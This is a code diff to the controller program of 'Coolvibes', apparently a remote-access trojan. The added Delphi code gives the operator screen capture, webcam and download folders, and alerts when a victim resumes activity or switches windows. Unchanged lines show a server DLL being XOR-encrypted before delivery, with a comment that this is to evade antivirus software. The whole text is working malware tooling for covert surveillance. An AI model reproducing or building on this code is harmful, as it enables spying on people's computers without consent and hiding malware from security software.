@@ -22,7 +22,7 @@ uses
   Dialogs, ExtCtrls, XPMan, ComCtrls, Buttons, StdCtrls, ImgList, jpeg,
   Menus, IniFiles, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
   IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer,
-  UnitVariables, AppEvnts, gnugettext, CommCtrl;
+  UnitVariables, AppEvnts, gnugettext, CommCtrl, MMSystem;
 
 const
   WM_POP_MESSAGE = WM_USER + 1;  //Mensaje usado para las notificaciones
@@ -109,6 +109,13 @@ type
     Cerrar1: TMenuItem;
     Actualizar1: TMenuItem;
     Desinstalar1: TMenuItem;
+    UsuarioPC1: TMenuItem;
+    Accesorpido1: TMenuItem;
+    Capturapantalla1: TMenuItem;
+    Avisarcuando1: TMenuItem;
+    VuelvaaaveractividadenelPC1: TMenuItem;
+    Cambiedeventana1: TMenuItem;
+    Avisos1: TMenuItem;
     procedure BtnEscucharClick(Sender: TObject);
     procedure ListViewConexionesContextPopup(Sender: TObject;
       MousePos: TPoint; var Handled: boolean);
@@ -152,6 +159,9 @@ type
     procedure StatusBarMouseMove(Sender: TObject; Shift: TShiftState; X,
       Y: Integer);
     procedure StatusBarClick(Sender: TObject);
+    procedure Capturapantalla1Click(Sender: TObject);
+    procedure VuelvaaaveractividadenelPC1Click(Sender: TObject);
+    procedure Cambiedeventana1Click(Sender: TObject);
   private
     ColumnaOrdenada, Columna: integer;
     WndMethod: TWndMethod;
@@ -163,6 +173,7 @@ type
     procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
     procedure OnEventReceive(var Msg: TMessage); message WM_EVENT_MESSAGE;
     procedure NotiMsnDesconect(tItem: TListItem);
+    function CrearVentanaControl(Item:TListitem):TObject;    //Crea un Centro de control para el item seleccionado
   public
     Idioma : string; //El idioma actual
     Columnas : array[0..8] of string; //Para saber el orden de las columnas
@@ -222,7 +233,7 @@ procedure TFormMain.FormCloseQueryMinimizarAlTray(Sender: TObject;
   var CanClose: boolean);
 begin
   MinimizeToTrayClick(Sender);
-  CanClose := False;          
+  CanClose := False;
 end;
 //Fin de eventos del Formulario
 
@@ -299,6 +310,10 @@ begin
       h.Free;
 
       StatusBar.Panels[0].Text := _('Esperando conexiones');
+      //Aqui podriamos actualizar el icono del tray icon
+      TrayIconData.uFlags := 0;
+      StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool+#13#10+_('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count));  //numero de conexiones en el trayicon
+      Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
       StatusBar.Panels[1].Text := _('Puerto(s): ') + FormOpciones.EditPuerto.Text;
     end
     else
@@ -349,7 +364,9 @@ begin
       end;
       h.Free;
       StatusBar.Panels[0].Text := _('Escucha detenida');
-      
+      TrayIconData.uFlags := 0;
+      StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool+#13#10+_('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count));  //numero de conexiones en el trayicon
+      Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
     end;
 
 end;
@@ -397,10 +414,18 @@ begin
   if Athread.Data <> nil then
   begin
     item := TListItem(Athread.Data);
-    //cerrar la  ventana del item correspondiente
+
     if item.SubItems.Objects[1] <> nil then
     begin
-      (item.SubItems.Objects[1] as TFormControl).Close;
+      if FormOpciones.CheckBoxCerrarControlAlDesc.checked then
+      begin
+        (item.SubItems.Objects[1] as TFormControl).Close;
+        (item.SubItems.Objects[1] as TFormControl).Free;
+      end
+      else
+      begin
+        (item.SubItems.Objects[1] as TFormControl).caption := (item.SubItems.Objects[1] as TFormControl).caption+' '+_('DESCONECTADO');
+      end;
     end;
     if NotiMsnServerDesc then
     begin
@@ -417,9 +442,13 @@ begin
   finally
     Athread.Connection.Server.Threads.UnlockList();
   end;
-
-  FormEstadisticasConexiones.LabelNConexiones.Caption := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
-  StatusBar.Panels[0].Text := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
+  //actualizamos tray icon
+  TrayIconData.uFlags := 0;
+  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool+#13#10+_('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count));  //numero de conexiones en el trayicon
+  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
+  
+  FormEstadisticasConexiones.LabelNConexiones.Caption := _('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count);
+  StatusBar.Panels[0].Text := _('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count);
 end;
 
 procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
@@ -439,6 +468,7 @@ begin
   end;
   Len := Length(Buffer);
 
+  
   if Buffer = 'CONNECTED?' then
     Exit  //Lo ignoramos
   else if Buffer = 'PING' then
@@ -449,17 +479,15 @@ begin
   begin                           //GETSERVER|clavecifrado1|clavecifrado2|
    Recibido := buffer;
    Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el GETSERVER|
-
-  //Globo emergente de intento de conexión ??
     TmpServDLL := ServDll;
-    if NotificacionMsn then //solo si está activa la notificación MSN de lo contrario podría molestar
-      GloboEmergente(_('Pidiendo Servidor'), _('Pidiendo Servidor'), NIIF_INFO);
+    if FormOpciones.CheckBoxGloboalPedirS.checked then
+      GloboEmergente(_('Pidiendo Servidor'), _('IP:')+' '+Athread.Connection.Socket.Binding.PeerIP, NIIF_INFO);
+
     for i := 1 to length(ServDLL) do  //con la primera clave
       TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
     Delete(Recibido, 1, Pos('|', Recibido));
     for i := 1 to length(ServDLL) do
       TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
-
 
     Athread.Connection.Write(#14+inttostr(length(TmpServDLL))+#14+TmpServDLL);
   end
@@ -471,9 +499,17 @@ begin
     Recibido := Buffer;
     Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el PONG
 
+    if Item.SubItems[5] <> Copy(Recibido, 1, Pos('|', Recibido) - 1) then
+      if POS('V', Item.SubItems[11])>0 then
+        GloboEmergente(_('Cambio de Ventana: ')+item.caption, Copy(Recibido, 1, Pos('|', Recibido) - 1), NIIF_INFO);
 
     Item.SubItems[5] := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Active Window Caption
     Delete(Recibido, 1, Pos('|', Recibido));
+    
+    if StrToDateTime(item.subitems[6]) > StrToDateTime(Copy(Recibido, 1, Pos('|', Recibido) - 1)) then
+      if POS('A', Item.SubItems[11])>0 then
+        GloboEmergente(_('Actividad detectada'), item.caption, NIIF_INFO);
+
     Item.SubItems[6] := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //TSU
     Delete(Recibido, 1, Pos('|', Recibido));
     Item.SubItems[7] := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Uptime
@@ -484,22 +520,6 @@ begin
 
     Exit;
   end;
-
-  //Buscamos a que item corresponde la conexión
-  for i := 0 to ListViewConexiones.Items.Count - 1 do
-    if ListViewConexiones.Items[i] <> nil then
-    if ListViewConexiones.Items[i].SubItems.Objects[0] <> nil then
-    if Athread.Handle = TIdPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]).Handle then
-    begin
-      item := ListViewConexiones.Items[i];
-      //Enviarle la conexión a la ventana de ese item, si la tiene
-      if item.SubItems.Objects[1] <> nil then
-      begin
-        (item.SubItems.Objects[1] as TFormControl).OnRead(Buffer, Athread);
-        Exit;
-      end;
-      exit;
-    end;
 
   {Si llega aquí es que el SocketHandle no se encontró entre los SocketHandles
    de las conexiones principales y una de dos:
@@ -531,17 +551,21 @@ begin
     for i := 0 to listviewconexiones.columns.Count-1 do  //El resto de valores los copiamos tal cual
     begin
       Delete(Recibido, 1, Pos('|', Recibido));
-      if i = 0 then
-        Recibido := Athread.Connection.Socket.Binding.PeerIP + ' / '+ Recibido;
+      if i = 0 then  //Sólo nos envia la ip local, así que agregamos la publica
+        Recibido := Athread.Connection.Socket.Binding.PeerIP + ' / '+ Recibido
+      else
+      if i = 9 then  //Puerto
+        Recibido := inttostr(Athread.Connection.Server.DefaultPort)+'|'+Recibido;
       Item.SubItems[i] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
     end;
     
-    Item.SubItems[9] := inttostr(Athread.Connection.Server.DefaultPort);
+
     Recibido := Item.SubItems[8]; //Idioma
     Delete(Recibido, 1, Pos('_', Recibido));
+
     item.ImageIndex := 77;//bandera de famfamfam
 
-    for i:=0 to 246 do
+    for i:=0 to 246 do              //Buscamos la bandera que le corresponde a ese idioma
       if banderas[i] = lowercase(Recibido) then
         item.ImageIndex := i+7;
 
@@ -550,11 +574,19 @@ begin
     Recibido := '';
     if NotificacionMsn then
       SendMessage(FormMain.Handle, WM_POP_MESSAGE, integer(Item), 0);
-      SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 0,integer(Item));
+
+    if FormOpciones.CheckBoxAlertaSonora.checked then    //Alerta sonora
+      if fileexists(Formopciones.EditRutaArchivoWav.text) then
+      begin
+        sndPlaySound(nil, 0); //Paramos el anterior si está sonando
+        sndPlaySound(Pchar(Formopciones.EditRutaArchivoWav.text), SND_NODEFAULT or SND_ASYNC);
+      end;
+    //Mandamos el evento de nueva conexion
+    SendMessage(FormMain.Handle, WM_EVENT_MESSAGE, 0{0=nueva conexión},integer(Item));
   end
   {Si llega aquí es que es una conexión de transferencia, con SH|12345, se recibe el SocketHandle
   que relacciona esta conexión de transferencia con la conexión principal}
-  else if Copy(PChar(Buffer), 1, 2) = 'SH' then
+  else if Copy(PChar(Buffer), 1, 3) = 'SH|' then
   begin
     Recibido := Copy(PChar(Buffer), 1, len);
     Delete(Recibido, 1, 3); // 'SH|12345'
@@ -573,8 +605,30 @@ begin
         exit;
       end;
   end;
-   FormEstadisticasConexiones.LabelNConexiones.Caption := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
-   StatusBar.Panels[0].Text := _('Numero de conexiones: ')+inttostr(Listviewconexiones.Items.count);
+
+    //Buscamos a que item corresponde la conexión
+  for i := 0 to ListViewConexiones.Items.Count - 1 do
+    if ListViewConexiones.Items[i] <> nil then
+    if ListViewConexiones.Items[i].SubItems.Objects[0] <> nil then
+    if Athread.Handle = TIdPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]).Handle then
+    begin
+      item := ListViewConexiones.Items[i];
+      //Enviarle la conexión a la ventana de ese item, si la tiene
+      if item.SubItems.Objects[1] <> nil then
+      begin
+        (item.SubItems.Objects[1] as TFormControl).OnRead(Buffer, Athread);
+        Exit;
+      end;
+      exit;
+    end;
+
+    
+   TrayIconData.uFlags := 0;
+   StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool+#13#10+_('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count));  //numero de conexiones en el trayicon
+   Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
+
+   FormEstadisticasConexiones.LabelNConexiones.Caption := _('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count);
+   StatusBar.Panels[0].Text := _('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count);
 end;
 //Fin de eventos del ServerSocket
 
@@ -585,46 +639,32 @@ begin
     //No se ha seleccionado item, deshabilitar menu
   begin
     PopupMenuConexiones.Items[0].Enabled := False;
-    PopupMenuConexiones.Items[2].Enabled := False;
+    PopupMenuConexiones.Items[1].Enabled := False;
     PopupMenuConexiones.Items[3].Enabled := False;
     PopupMenuConexiones.Items[4].Enabled := False;
+    PopupMenuConexiones.Items[5].Enabled := False;
   end
   else
   begin
     PopupMenuConexiones.Items[0].Enabled := True;
-    PopupMenuConexiones.Items[2].Enabled := True;
+    PopupMenuConexiones.Items[1].Enabled := True;
     PopupMenuConexiones.Items[3].Enabled := True;
     PopupMenuConexiones.Items[4].Enabled := True;
+    PopupMenuConexiones.Items[5].Enabled := True;
   end;
 end;
 
 //Al dar al boton abrir
 procedure TFormMain.Abrir1Click(Sender: TObject);
 var
-  NuevaVentanaControl: TFormControl;
-  AThread: TIdPeerThread;
+  VentanaControl: TFormControl;
   mslistviewitem : TListItem;
 begin
   mslistviewitem := ListViewConexiones.Selected;
-
-
   while Assigned(mslistviewitem) do
   begin
-    if mslistviewitem.SubItems.Objects[1] <> nil then
-      TFormControl(mslistviewitem.SubItems.Objects[1]).Show
-    else
-    begin
-      Athread := TIdPeerThread(mslistviewitem.SubItems.Objects[0]);
-      NuevaVentanaControl := TFormControl.Create(self, Athread);
-      mslistviewitem.SubItems.Objects[1] := NuevaVentanaControl;
-
-      NuevaVentanaControl.Caption :=
-      _('Centro de control: ') + mslistviewitem.caption +
-      ' ' + Athread.Connection.Socket.Binding.PeerIP;
-      NuevaVentanaControl.NombrePC := mslistviewitem.caption;
-      NuevaVentanaControl.Show;
-
-    end;
+    VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
+    VentanaControl.Show;
     mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
   end;
 end;
@@ -652,7 +692,7 @@ end;
 
 procedure TFormMain.Cambiarnombre1Click(Sender: TObject);
 begin
-  FormID.Show;
+  FormID.ShowModal;
 end;
 
 //Al pulsar en la columna del ListViewConexiones ordenar filas según el valor de esa columna
@@ -728,6 +768,22 @@ begin
         Ini.ReadString('Opciones', 'PingTimerInterval', '30');
       CheckBoxAutoRefrescar.Checked :=
         Ini.ReadBool('Opciones', 'AutoRefrescar', False);
+      CheckBoxCerrarControlAlDesc.Checked :=
+        Ini.ReadBool('Opciones', 'CerrarControlAlDesconectar', False);
+      CheckBoxGloboalPedirS.Checked :=
+        Ini.ReadBool('Opciones', 'GloboAlPedirServidor', True);
+      CheckBoxAlertaSonora.Checked :=
+        Ini.ReadBool('Opciones', 'AlertaSonora', False);
+      EditRutaArchivoWav.text :=
+        Ini.ReadString('Opciones', 'AlertaSonoraPath', Extractfilepath(paramstr(0))+'archivowav.wav');
+      CheckBoxCCIndependiente.Checked :=
+        Ini.ReadBool('Opciones', 'CControlIndependiente', False);
+      LabeledEditDirUser.Text := Ini.ReadString('Opciones', 'PathUsuario', '%CoolDir%\Usuarios\%%Identificator\');
+      LabeledDirScreen.Text := Ini.ReadString('Opciones', 'PathCapturas', '%CoolDir%\Usuarios\%Identificator%\Capturas\');
+      LabeledDirWebcam.Text := Ini.ReadString('Opciones', 'PathWebcam', '%CoolDir%\Usuarios\%Identificator%\Webcam\');
+      LabeledDirThumbs.Text := Ini.ReadString('Opciones', 'PathMiniaturas', '%CoolDir%\Usuarios\%Identificator%\Miniaturas\');
+      LabeledDirDownloads.Text := Ini.ReadString('Opciones', 'PathDescargas', '%CoolDir%\Usuarios\%Identificator%\Descargas\');
+
     end;
     //Valores de la Form de Configuracion del server
     with FormConfigServer do
@@ -770,7 +826,6 @@ begin
     for i:=0 to listviewconexiones.columns.Count-1 do
     begin
           c := listviewconexiones.columns[searchcolumnbyid(i)];
-          //c.Caption:= Ini.ReadString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', columnas[i]);
           c.Index := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Index',c.Index);
 
           if Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100) = -1 then
@@ -823,6 +878,22 @@ begin
     Ini.WriteString('Opciones', 'PingTimerInterval', FormOpciones.EditPingTimerInterval.text);
     Ini.WriteBool('Opciones', 'AutoRefrescar',
       FormOpciones.CheckBoxAutoRefrescar.Checked);
+    Ini.WriteBool('Opciones', 'CerrarControlAlDesconectar',
+      FormOpciones.CheckBoxCerrarControlAlDesc.Checked);
+    Ini.WriteBool('Opciones', 'GloboAlPedirServidor',
+      FormOpciones.CheckBoxGloboalPedirS.Checked);
+    Ini.WriteBool('Opciones', 'AlertaSonora',
+      FormOpciones.CheckBoxAlertaSonora.Checked);
+    Ini.WriteString('Opciones', 'AlertaSonoraPath', FormOpciones.EditRutaArchivoWav.text);
+    Ini.WriteBool('Opciones', 'CControlIndependiente',
+      FormOpciones.CheckBoxCCIndependiente.Checked);
+
+    Ini.WriteString('Opciones', 'PathUsuario', FormOpciones.LabeledEditDirUser.Text);
+    Ini.WriteString('Opciones', 'PathCapturas', FormOpciones.LabeledDirScreen.Text);
+    Ini.WriteString('Opciones', 'PathWebcam', FormOpciones.LabeledDirWebcam.Text);
+    Ini.WriteString('Opciones', 'PathMiniaturas', FormOpciones.LabeledDirThumbs.Text);
+    Ini.WriteString('Opciones', 'PathDescargas', FormOpciones.LabeledDirDownloads.Text);
+    
     //Valores de la Form de Configuracion del server
     Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
     Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
@@ -853,6 +924,7 @@ begin
       FormConfigServer.CheckBoxUPX.Checked);
     Ini.WriteBool('ConfigurarServidor', 'Cifrar',
       FormConfigServer.CheckBoxCifrar.Checked);
+
 
 
       //Guardamos el estado de las columnas del Tlistview :D
@@ -886,15 +958,20 @@ var
   i                      : integer;
 begin
   Application.OnMinimize := MinimizeToTrayClick;
+  Application.HintColor     := TColor($FFD7C1); //un azul clarito
+  Application.HintHidePause := 20000; //desaparece a los 20 segundos
+  Application.HintPause     := 200;
+
   //Inicializar el icono de la TrayBar
+  self.DoubleBuffered := true; //Evita parpadeos
+  self.ListViewConexiones.DoubleBuffered := true;
   TrayIconData.cbSize := SizeOf(TrayIconData);
   TrayIconData.Wnd    := Handle;
   TrayIconData.uID    := 0;
   TrayIconData.uFlags := NIF_MESSAGE + NIF_ICON + NIF_TIP;
   TrayIconData.uCallbackMessage := WM_ICONTRAY;//el mensaje que deberemos interceptar
   TrayIconData.hIcon  := Application.Icon.Handle;
-  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool);
-  
+  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool+#13#10+_('Escuchando:')+' '+_('No')+#13#10+_('Número de conexiones: ')+inttostr(Listviewconexiones.Items.count));
   Shell_NotifyIcon(NIM_ADD, @TrayIconData);
 
   Self.Caption := 'Coolvibes '+VersionCool+' Update '+UpdateNum+' ::   [ www.indetectables.net ]';
@@ -1017,6 +1094,8 @@ begin
     if WindowState = wsMinimized then
       WindowState := wsNormal;  {Reset minimized state}
     Visible := True;
+    if not IsWindowVisible(Application.Handle) then
+      ShowWindow(Application.Handle, SW_SHOW);
     SetForegroundWindow(Application.Handle); {Force form to the foreground }
   end;
 end;
@@ -1302,6 +1381,70 @@ procedure TFormMain.StatusBarClick(Sender: TObject);
 begin
   if statusbar.Cursor = CrHandPoint then
     FormEstadisticasConexiones.show;
+end;
+
+function TFormMain.CrearVentanaControl(Item:TListitem):TObject;
+var
+  AThread: TIdPeerThread;
+  NuevaVentanaControl : TFormControl;
+begin
+  if Item.SubItems.Objects[1] = nil then
+  begin
+    Athread := TIdPeerThread(item.SubItems.Objects[0]);
+    NuevaVentanaControl := TFormControl.Create(self, Athread, item);
+    Item.SubItems.Objects[1] := NuevaVentanaControl;
+  end;
+  Result := Item.SubItems.Objects[1];
+end;
+
+procedure TFormMain.Capturapantalla1Click(Sender: TObject);
+var
+  VentanaControl: TFormControl;
+  mslistviewitem : TListItem;
+begin
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+  begin
+    VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
+    VentanaControl.BtnVerGrandeCap.Click;
+    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+  end;
+end;
+
+procedure TFormMain.VuelvaaaveractividadenelPC1Click(Sender: TObject);
+var
+  mslistviewitem : TListItem;
+  tmp : string;
+begin
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+  begin
+    tmp := mslistviewitem.subitems[11];
+    if POS('A'{actividad}, tmp) > 0 then
+      tmp := StringReplace(tmp,'A', '', [rfReplaceAll]) //Eliminamos la "A"
+    else
+      tmp := tmp+'A';
+    mslistviewitem.subitems[11] := tmp;
+    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+  end;
+end;
+
+procedure TFormMain.Cambiedeventana1Click(Sender: TObject);
+var
+  mslistviewitem : TListItem;
+  tmp : string;
+begin
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+  begin
+    tmp := mslistviewitem.subitems[11];
+    if POS('V'{ventana}, tmp) > 0 then
+      tmp := StringReplace(tmp,'V', '', [rfReplaceAll]) //Eliminamos la "A"
+    else
+      tmp := tmp+'V';
+    mslistviewitem.subitems[11] := tmp;
+    mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+  end;
 end;
 
 end.
